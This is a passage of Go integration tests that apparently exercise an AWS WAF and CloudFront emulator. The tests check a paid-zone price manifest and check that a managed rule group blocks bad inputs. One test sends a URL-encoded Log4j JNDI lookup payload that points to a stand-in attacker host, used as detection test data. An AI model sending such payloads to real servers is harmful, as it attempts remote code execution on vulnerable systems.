						HTTPPort:             aws.Int32(50080),
						HTTPSPort:            aws.Int32(50443),
						OriginProtocolPolicy: cftypes.OriginProtocolPolicyHttpOnly,
						OriginReadTimeout:    aws.Int32(30),
					},
				}},
			},
			DefaultCacheBehavior: &cftypes.DefaultCacheBehavior{
				TargetOriginId:       aws.String("integ-origin"),
				ViewerProtocolPolicy: cftypes.ViewerProtocolPolicyAllowAll,
				AllowedMethods: &cftypes.AllowedMethods{
					Quantity: aws.Int32(2),
					Items:    []cftypes.Method{cftypes.MethodHead, cftypes.MethodGet},
				},
				ForwardedValues: &cftypes.ForwardedValues{
					QueryString: aws.Bool(false),
					Cookies:     &cftypes.CookiePreference{Forward: cftypes.ItemSelectionNone},
				},
				MinTTL:     aws.Int64(0),
				DefaultTTL: aws.Int64(0),
				MaxTTL:     aws.Int64(0),
			},
			ViewerCertificate: &cftypes.ViewerCertificate{
				CloudFrontDefaultCertificate: aws.Bool(true),
			},
			Restrictions: &cftypes.Restrictions{
				GeoRestriction: &cftypes.GeoRestriction{
					RestrictionType: cftypes.GeoRestrictionTypeNone,
					Quantity:        aws.Int32(0),
				},
			},
		},
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Monetize", func() error { return fmt.Errorf("create distribution: %w", err) })
	}
	distID := aws.ToString(distResp.Distribution.Id)
	distARN := aws.ToString(distResp.Distribution.ARN)
	etag := aws.ToString(distResp.ETag)
	defer func() {
		// A distribution must be disabled before it can be deleted.
		config := distResp.Distribution.DistributionConfig
		if config != nil {
			config.Enabled = aws.Bool(false)
			if upd, err := ic.cloudfront.UpdateDistribution(ic.ctx, &cloudfront.UpdateDistributionInput{
				Id: aws.String(distID), IfMatch: aws.String(etag), DistributionConfig: config,
			}); err == nil && upd.ETag != nil {
				etag = *upd.ETag
			}
		}
		_, _ = ic.cloudfront.DeleteDistribution(ic.ctx, &cloudfront.DeleteDistributionInput{
			Id: aws.String(distID), IfMatch: aws.String(etag),
		})
	}()

	domain := aws.ToString(distResp.Distribution.DomainName)
	if domain == "" {
		domain = distID + ".cloudfront.net"
	}

	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(distARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_Monetize", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(distARN)})

	base := fmt.Sprintf("http://127.0.0.1:%d", cloudFrontIntegPort)

	return r.RunTest(integSvc, "WAF_Enforcement_Monetize", func() error {
		resp, body, err := r.integHTTPSend(http.MethodGet, base+"/paid-zone", domain, nil, nil)
		if err != nil {
			return fmt.Errorf("monetized request: %w", err)
		}
		if resp.StatusCode != http.StatusPaymentRequired {
			return fmt.Errorf("monetized request: expected 402, got %d (body: %s)", resp.StatusCode, body)
		}
		if ct := resp.Header.Get("Content-Type"); ct != "application/json" {
			return fmt.Errorf("price manifest Content-Type = %q, want application/json", ct)
		}
		var manifest struct {
			PriceMultiplier string `json:"priceMultiplier"`
			CurrencyMode    string `json:"currencyMode"`
			PaymentNetworks []struct {
				Chain         string `json:"chain"`
				WalletAddress string `json:"walletAddress"`
				Prices        []struct {
					Amount          string `json:"amount"`
					EffectiveAmount string `json:"effectiveAmount"`
					Currency        string `json:"currency"`
				} `json:"prices"`
			} `json:"paymentNetworks"`
		}
		if err := json.Unmarshal([]byte(body), &manifest); err != nil {
			return fmt.Errorf("price manifest is not JSON: %v (%s)", err, body)
		}
		if manifest.PriceMultiplier != "2" || manifest.CurrencyMode != "TEST" {
			return fmt.Errorf("price manifest header fields = %+v", manifest)
		}
		if len(manifest.PaymentNetworks) != 1 {
			return fmt.Errorf("price manifest networks = %+v", manifest.PaymentNetworks)
		}
		network := manifest.PaymentNetworks[0]
		if network.Chain != "BASE_SEPOLIA" ||
			network.WalletAddress != "0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed" {
			return fmt.Errorf("price manifest network = %+v", network)
		}
		if len(network.Prices) != 1 {
			return fmt.Errorf("price manifest prices = %+v", network.Prices)
		}
		price := network.Prices[0]
		if price.Amount != "0.010" || price.EffectiveAmount != "0.02" || price.Currency != "USDC" {
			return fmt.Errorf("price manifest price = %+v, want amount 0.010 effective 0.02 USDC", price)
		}

		// A non-matching request passes to the origin.
		resp, body, err = r.integHTTPSend(http.MethodGet, base+"/.well-known/health", domain, nil, nil)
		if err != nil {
			return fmt.Errorf("free request: %w", err)
		}
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("free request: expected 200 from the origin, got %d (body: %s)", resp.StatusCode, body)
		}
		return nil
	})
}

// runWAFEnforcementManagedRuleGroup verifies managed rule group
// enforcement on the CloudFront plane: a web ACL rule referencing the
// Known Bad Inputs group blocks a Log4j lookup payload carried in the
// query string, while a clean request reaches the origin.
func (r *TestRunner) runWAFEnforcementManagedRuleGroup(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-mrg-acl-%s", ts)
	distName := fmt.Sprintf("integ-mrg-dist-%s", ts)

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeCloudfront, []waftypes.Rule{{
		Name:     aws.String("KnownBadInputs"),
		Priority: 0,
		Statement: &waftypes.Statement{
			ManagedRuleGroupStatement: &waftypes.ManagedRuleGroupStatement{
				VendorName: aws.String("AWS"),
				Name:       aws.String("AWSManagedRulesKnownBadInputsRuleSet"),
			},
		},
		VisibilityConfig: wafACLVisibility("KnownBadInputsRule"),
	}})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_ManagedRuleGroup", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeCloudfront, aclARN)

	distResp, err := ic.cloudfront.CreateDistribution(ic.ctx, &cloudfront.CreateDistributionInput{
		DistributionConfig: &cftypes.DistributionConfig{
			CallerReference: aws.String(distName),
			Enabled:         aws.Bool(true),
			Comment:         aws.String("Managed rule group integration test"),
			Origins: &cftypes.Origins{
				Quantity: aws.Int32(1),
				Items: []cftypes.Origin{{
					Id:         aws.String("integ-origin"),
					DomainName: aws.String("127.0.0.1:50080"),
					CustomOriginConfig: &cftypes.CustomOriginConfig{
						HTTPPort:             aws.Int32(50080),
						HTTPSPort:            aws.Int32(50443),
						OriginProtocolPolicy: cftypes.OriginProtocolPolicyHttpOnly,
						OriginReadTimeout:    aws.Int32(30),
					},
				}},
			},
			DefaultCacheBehavior: &cftypes.DefaultCacheBehavior{
				TargetOriginId:       aws.String("integ-origin"),
				ViewerProtocolPolicy: cftypes.ViewerProtocolPolicyAllowAll,
				AllowedMethods: &cftypes.AllowedMethods{
					Quantity: aws.Int32(2),
					Items:    []cftypes.Method{cftypes.MethodHead, cftypes.MethodGet},
				},
				ForwardedValues: &cftypes.ForwardedValues{
					QueryString: aws.Bool(false),
					Cookies:     &cftypes.CookiePreference{Forward: cftypes.ItemSelectionNone},
				},
				MinTTL:     aws.Int64(0),
				DefaultTTL: aws.Int64(0),
				MaxTTL:     aws.Int64(0),
			},
			ViewerCertificate: &cftypes.ViewerCertificate{
				CloudFrontDefaultCertificate: aws.Bool(true),
			},
			Restrictions: &cftypes.Restrictions{
				GeoRestriction: &cftypes.GeoRestriction{
					RestrictionType: cftypes.GeoRestrictionTypeNone,
					Quantity:        aws.Int32(0),
				},
			},
		},
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_ManagedRuleGroup", func() error { return fmt.Errorf("create distribution: %w", err) })
	}
	distID := aws.ToString(distResp.Distribution.Id)
	distARN := aws.ToString(distResp.Distribution.ARN)
	etag := aws.ToString(distResp.ETag)
	defer func() {
		// A distribution must be disabled before it can be deleted.
		config := distResp.Distribution.DistributionConfig
		if config != nil {
			config.Enabled = aws.Bool(false)
			if upd, err := ic.cloudfront.UpdateDistribution(ic.ctx, &cloudfront.UpdateDistributionInput{
				Id: aws.String(distID), IfMatch: aws.String(etag), DistributionConfig: config,
			}); err == nil && upd.ETag != nil {
				etag = *upd.ETag
			}
		}
		_, _ = ic.cloudfront.DeleteDistribution(ic.ctx, &cloudfront.DeleteDistributionInput{
			Id: aws.String(distID), IfMatch: aws.String(etag),
		})
	}()

	domain := aws.ToString(distResp.Distribution.DomainName)
	if domain == "" {
		domain = distID + ".cloudfront.net"
	}

	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(distARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_ManagedRuleGroup", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(distARN)})

	base := fmt.Sprintf("http://127.0.0.1:%d", cloudFrontIntegPort)

	return r.RunTest(integSvc, "WAF_Enforcement_ManagedRuleGroup", func() error {
		// A Log4j lookup payload in the query string matches the group's
		// Log4JRCE_QUERYSTRING rule and is blocked before the origin.
		resp, body, err := r.integHTTPSend(http.MethodGet,
			base+"/search?q=%24%7Bjndi:ldap://evil.example/a%7D", domain, nil, nil)
		if err != nil {
			return fmt.Errorf("log4j request: %w", err)
		}
		if resp.StatusCode != http.StatusForbidden {
			return fmt.Errorf("log4j request: expected 403 from the managed rule group, got %d (body: %s)", resp.StatusCode, body)
		}

		// A clean request passes through to the origin.
		resp, body, err = r.integHTTPSend(http.MethodGet, base+"/.well-known/health", domain, nil, nil)
		if err != nil {
			return fmt.Errorf("clean request: %w", err)
		}
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("clean request: expected 200 from the origin, got %d (body: %s)", resp.StatusCode, body)
		}

		// The blocked request's sample carries the managed rule name
		// format vendor#ruleGroup#rule and the response code sent.
		now := time.Now()
		samples, err := ic.wafv2.GetSampledRequests(ic.ctx, &wafv2.GetSampledRequestsInput{
			WebAclArn:      aws.String(aclARN),
			RuleMetricName: aws.String("Log4JRCE_QUERYSTRING"),
			Scope:          waftypes.ScopeCloudfront,
			TimeWindow: &waftypes.TimeWindow{
				StartTime: aws.Time(now.Add(-time.Hour)),
				EndTime:   aws.Time(now.Add(time.Minute)),
			},
			MaxItems: aws.Int64(100),
		})
		if err != nil {
			return err
		}
		if len(samples.SampledRequests) == 0 {
			return fmt.Errorf("expected a sampled request of the managed rule")
		}
		first := samples.SampledRequests[0]
		if aws.ToString(first.RuleNameWithinRuleGroup) != "AWS#AWSManagedRulesKnownBadInputsRuleSet#Log4JRCE_QUERYSTRING" {
			return fmt.Errorf("expected the managed within-group name, got %q", aws.ToString(first.RuleNameWithinRuleGroup))
		}
		if aws.ToInt32(first.ResponseCodeSent) != http.StatusForbidden {
			return fmt.Errorf("expected ResponseCodeSent 403, got %d", aws.ToInt32(first.ResponseCodeSent))
		}
		return nil
	})
}
